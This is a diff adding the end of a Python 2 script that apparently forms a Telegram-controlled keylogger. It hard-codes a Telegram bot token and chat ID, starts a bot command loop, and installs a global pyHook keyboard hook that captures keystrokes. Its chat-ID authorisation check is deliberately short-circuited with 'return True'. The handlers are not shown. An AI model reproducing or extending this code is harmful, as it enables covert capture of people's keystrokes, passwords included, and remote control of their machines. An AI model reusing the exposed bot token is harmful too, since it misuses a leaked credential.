@@ -1,0 +1,22 @@
+
+def checkchat_id(chat_id):
+	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
+	known_ids = ['131788818']
+	# COMMENT THE LINE 'return True'!
+	return True
+
+	try:
+		return str(chat_id) in known_ids
+	except:
+		return str(chat_id) == known_ids
+
+# REPLACE 'abcd1234' BY THE TOKEN OF THE BOT YOU GENERATED!
+bot = telepot.Bot('304838120:AAFjUoc_ismRvD-sJ2rfmPPuMnK-IQl8vCQ')
+
+bot.message_loop(handle)
+print 'Listening to commands...'
+
+proc = pyHook.HookManager()
+proc.KeyDown = pressed_chars
+proc.HookKeyboard()
+pythoncom.PumpMessages()
